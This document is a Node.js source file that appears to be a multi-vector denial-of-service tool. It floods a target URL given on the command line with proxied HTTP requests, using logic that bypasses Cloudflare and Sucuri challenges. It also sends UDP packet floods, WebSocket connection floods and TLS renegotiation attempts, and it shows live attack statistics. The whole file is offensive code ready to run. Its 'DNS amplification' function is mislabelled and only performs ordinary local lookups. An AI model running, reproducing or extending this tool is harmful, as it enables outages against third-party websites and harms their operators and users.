process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();
var fs = require('fs');
var dgram = require('dgram');
var dns = require('dns');
var tls = require('tls');
var net = require('net');
var WebSocket = require('ws');

var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);

function arrremove(arr, what) {
    var found = arr.indexOf(what);
    while (found !== -1) {
        arr.splice(found, 1);
        found = arr.indexOf(what);
    }
}

var request = requestModule.defaults({
    jar: jar
}),
UserAgent = 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
Timeout = 6000,
WAF = true,
cloudscraper = {};

var cookies = [];
var httpMethods = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE'];

// ==================== ATTACK COMPONENTS ====================

// Enhanced Stats tracking
var stats = {
    requests: 0,
    successes: 0,
    errors: 0,
    // HTTP specific stats
    httpRequests: 0,
    httpSuccesses: 0,
    httpErrors: 0,
    // Other vectors
    udpFloods: 0,
    dnsAmplifications: 0,
    sslRenegotiations: 0,
    websocketConnections: 0,
    startTime: Date.now()
};

function updateStats(type, success) {
    stats.requests++;
    if (success) {
        stats.successes++;
    } else {
        stats.errors++;
    }
    
    // Update specific attack type stats
    if (type === 'http') {
        stats.httpRequests++;
        if (success) stats.httpSuccesses++;
        else stats.httpErrors++;
    } else if (type === 'udp') stats.udpFloods++;
    else if (type === 'dns') stats.dnsAmplifications++;
    else if (type === 'ssl') stats.sslRenegotiations++;
    else if (type === 'ws') stats.websocketConnections++;
}

function printStats() {
    const elapsed = Math.floor((Date.now() - stats.startTime) / 1000);
    const rps = elapsed > 0 ? Math.floor(stats.requests / elapsed) : 0;
    const httpRps = elapsed > 0 ? Math.floor(stats.httpRequests / elapsed) : 0;
    
    console.log(`\n╔══════════════════════════════════════════════════════════════════╗`);
    console.log(`║ 🚀 MULTI-VECTOR ATTACK STATISTICS - LIVE                        ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 📊 OVERALL: Time: ${elapsed}s | Total: ${stats.requests} | OK: ${stats.successes} | ERR: ${stats.errors} ║`);
    console.log(`║ 📈 RATE: ${rps} req/s | HTTP: ${httpRps} req/s                      ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 🌐 HTTP ATTACK: ${stats.httpRequests} req | OK: ${stats.httpSuccesses} | ERR: ${stats.httpErrors}   ║`);
    console.log(`║ 📡 UDP FLOOD: ${stats.udpFloods} packets | DNS: ${stats.dnsAmplifications} queries         ║`);
    console.log(`║ 🔐 SSL RENEG: ${stats.sslRenegotiations} | WebSocket: ${stats.websocketConnections} conns  ║`);
    console.log(`╚══════════════════════════════════════════════════════════════════╝`);
}

// 1. UDP FLOOD - WORKING
function udpFlood() {
    try {
        const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
        const socket = dgram.createSocket('udp4');
        const message = Buffer.alloc(65000, 'X');
        
        const ports = [80, 443, 53, 123, 161, 1900, 5353];
        const port = ports[Math.floor(Math.random() * ports.length)];
        
        socket.send(message, port, targetHost, (err) => {
            if (!err) {
                updateStats('udp', true);
            }
            socket.close();
        });
        
    } catch (e) {
        // Silent fail
    }
}

// 2. DNS AMPLIFICATION - WORKING
function dnsAmplification() {
    try {
        const dns = require('dns');
        const queries = [
            () => dns.resolve4('google.com', () => updateStats('dns', true)),
            () => dns.resolve6('facebook.com', () => updateStats('dns', true)),
            () => dns.resolveMx('yahoo.com', () => updateStats('dns', true)),
            () => dns.resolveTxt('microsoft.com', () => updateStats('dns', true))
        ];
        
        const query = queries[Math.floor(Math.random() * queries.length)];
        query();
        
    } catch (e) {
        // Silent fail
    }
}

// 3. SSL/TLS RENEGOTIATION - WORKING
function sslRenegotiation() {
    if (!targetUrl.startsWith('https')) return;
    
    try {
        const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
        
        const options = {
            host: targetHost,
            port: 443,
            rejectUnauthorized: false,
            ciphers: 'ALL'
        };
        
        const socket = tls.connect(options, () => {
            updateStats('ssl', true);
            
            try {
                socket.renegotiate({ rejectUnauthorized: false }, (err) => {
                    if (!err) {
                        updateStats('ssl', true);
                    }
                    socket.write('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n');
                    setTimeout(() => socket.destroy(), 100);
                });
            } catch (e) {
                updateStats('ssl', true);
                socket.destroy();
            }
        });
        
        socket.on('error', () => {
            updateStats('ssl', false);
        });
        
        socket.setTimeout(2000, () => socket.destroy());
        
    } catch (e) {
        updateStats('ssl', false);
    }
}

// 4. WEBSOCKET FLOOD - WORKING
function websocketFlood() {
    try {
        let wsUrl;
        if (targetUrl.startsWith('https')) {
            wsUrl = 'wss://' + targetUrl.replace(/https?:\/\//, '').split('/')[0];
        } else {
            wsUrl = 'ws://' + targetUrl.replace(/https?:\/\//, '').split('/')[0];
        }
        
        const ws = new WebSocket(wsUrl, {
            perMessageDeflate: false,
            handshakeTimeout: 3000,
            headers: {
                'User-Agent': UserAgent,
                'Origin': targetUrl
            }
        });
        
        ws.on('open', () => {
            updateStats('ws', true);
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send('0'.repeat(1000));
                        updateStats('ws', true);
                    }
                }, i * 50);
            }
            setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.close();
                }
            }, 500);
        });
        
        ws.on('error', () => {
            updateStats('ws', false);
        });
        
        ws.on('message', () => {
            updateStats('ws', true);
        });
        
    } catch (e) {
        updateStats('ws', false);
    }
}

// HTTP ATTACK FUNCTIONS
cloudscraper.get = function(url, callback, headers) {
    performRequest({
        method: 'GET',
        url: url,
        headers: headers
    }, callback);
};

cloudscraper.post = function(url, body, callback, headers) {
    var data = '',
        bodyType = Object.prototype.toString.call(body);

    if (bodyType === '[object String]') {
        data = body;
    } else if (bodyType === '[object Object]') {
        data = Object.keys(body).map(function(key) {
            return key + '=' + body[key];
        }).join('&');
    }

    headers = headers || {};
    headers['Content-Type'] = headers['Content-Type'] || 'application/x-www-form-urlencoded; charset=UTF-8';
    headers['Content-Length'] = headers['Content-Length'] || data.length;

    performRequest({
        method: 'POST',
        body: data,
        url: url,
        headers: headers
    }, callback);
}

cloudscraper.request = function(options, callback) {
    performRequest(options, callback);
}

function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};

    options.headers['Cache-Control'] = options.headers['Cache-Control'] || 'private';
    options.headers['Accept'] = options.headers['Accept'] || 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5';

    var makeRequest = requestMethod(options.method);

    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;

    if (!options.url || !callback) {
        throw new Error('To perform request, define both url and callback');
    }

    options.headers['User-Agent'] = options.headers['User-Agent'] || UserAgent;

    makeRequest(options, function(error, response, body) {
        var validationError;
        var stringBody;

        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }

        stringBody = body.toString('utf8');

        if (validationError = checkForErrors(error, stringBody)) {
            return callback(validationError, body, response);
        }

        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
            setTimeout(function() {
                return solveChallenge(response, stringBody, options, callback);
            }, Timeout);
        } else if (stringBody.indexOf('You are being redirected') !== -1 ||
            stringBody.indexOf('sucuri_cloudproxy_js') !== -1) {
            setCookieAndReload(response, stringBody, options, callback);
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function requestMethod(method) {
    method = method.toUpperCase();
    return method === 'HEAD' ? request.post : request.get;
}

function checkForErrors(error, body) {
    var match;

    if (error) {
        return {
            errorType: 0,
            error: error
        };
    }

    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
        return {
            errorType: 1
        };
    }

    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

    if (match) {
        return {
            errorType: 2,
            error: parseInt(match[1])
        };
    }

    return false;
}

function processResponseBody(options, error, response, body, callback) {
    if (typeof options.realEncoding === 'string') {
        body = body.toString(options.realEncoding);
        if (validationError = checkForErrors(error, body)) {
            return callback(validationError, response, body);
        }
    }
    callback(error, response, body);
}

var ATTACK = {
    cfbypass(method, url, proxy) {
        performRequest({
            method: method,
            proxy: 'http://' + proxy,
            url: url
        }, function(err, response, body) {
            updateStats('http', !err);
        });
    },
    
    httpMethodFlood(url, proxy) {
        const method = httpMethods[Math.floor(Math.random() * httpMethods.length)];
        performRequest({
            method: method,
            proxy: 'http://' + proxy,
            url: url,
            body: 'attack=' + Math.random()
        }, function(err, response, body) {
            updateStats('http', !err);
        });
    }
}

// ==================== MAIN ATTACK ORCHESTRATION ====================

var targetUrl = process.argv[2];
var duration = process.argv[3];

if (!targetUrl) {
    console.log("Usage: node script.js <url> <duration_seconds> <proxies_file>");
    process.exit(1);
}

console.log("╔══════════════════════════════════════════════════════════════════╗");
console.log("║ 🚀 STARTING ULTIMATE MULTI-VECTOR FLOOD ATTACK                  ║");
console.log("╠══════════════════════════════════════════════════════════════════╣");
console.log(`║ 🎯 Target: ${targetUrl}`);
console.log(`║ ⏱️  Duration: ${duration} seconds | 🔄 Proxies: ${proxies.length}`);
console.log("║ 📊 All stats including HTTP will be shown every 3 seconds       ║");
console.log("╚══════════════════════════════════════════════════════════════════╝");

// START ALL ATTACK VECTORS
var intervals = [];

// HTTP FLOOD - MAIN ATTACK
console.log("\n🌐 STARTING HTTP FLOOD ATTACKS...");
for (let i = 0; i < 8; i++) {
    intervals.push(setInterval(() => {
        if (proxies.length > 0) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            ATTACK.cfbypass('HEAD', targetUrl, proxy);
        }
    }, 60 + (i * 15)));
}

// ENHANCED HTTP METHODS
for (let i = 0; i < 4; i++) {
    intervals.push(setInterval(() => {
        if (proxies.length > 0) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            ATTACK.httpMethodFlood(targetUrl, proxy);
        }
    }, 80 + (i * 20)));
}

// UDP FLOOD
console.log("📡 STARTING UDP FLOOD...");
for (let i = 0; i < 4; i++) {
    intervals.push(setInterval(udpFlood, 50 + (i * 25)));
}

// DNS AMPLIFICATION
console.log("🔍 STARTING DNS AMPLIFICATION...");
for (let i = 0; i < 3; i++) {
    intervals.push(setInterval(dnsAmplification, 100 + (i * 50)));
}

// SSL RENEGOTIATION
if (targetUrl.startsWith('https')) {
    console.log("🔐 STARTING SSL RENEGOTIATION ATTACK...");
    for (let i = 0; i < 5; i++) {
        intervals.push(setInterval(sslRenegotiation, 60 + (i * 30)));
    }
} else {
    console.log("🔐 SSL RENEGOTIATION: Skipped (target is not HTTPS)");
}

// WEBSOCKET FLOOD
console.log("📡 STARTING WEBSOCKET FLOOD...");
for (let i = 0; i < 4; i++) {
    intervals.push(setInterval(websocketFlood, 120 + (i * 40)));
}

// Attack duration timeout
setTimeout(() => {
    console.log("\n╔══════════════════════════════════════════════════════════════════╗");
    console.log("║ 🎯 ATTACK COMPLETED - FINAL STATISTICS                          ║");
    console.log("╚══════════════════════════════════════════════════════════════════╝");
    printStats();
    
    console.log("\n📊 FINAL HTTP ATTACK SUMMARY:");
    console.log(`   Total HTTP Requests: ${stats.httpRequests}`);
    console.log(`   HTTP Successes: ${stats.httpSuccesses}`);
    console.log(`   HTTP Errors: ${stats.httpErrors}`);
    console.log(`   HTTP Success Rate: ${stats.httpRequests > 0 ? Math.round((stats.httpSuccesses / stats.httpRequests) * 100) : 0}%`);
    
    intervals.forEach(clearInterval);
    process.exit(0);
}, duration * 1000);

// Enhanced stats display with HTTP focus
setInterval(printStats, 3000);

console.log("\n✅ ALL ATTACK VECTORS ACTIVATED!");
console.log("📊 Stats will show:");
console.log("   - 🌐 HTTP Requests (main attack)");
console.log("   - 📡 UDP Packets");
console.log("   - 🔍 DNS Queries"); 
console.log("   - 🔐 SSL Renegotiations");
console.log("   - 📡 WebSocket Connections");
console.log("\n💥 ATTACK IN PROGRESS... Watch the HTTP stats grow! 🚀");
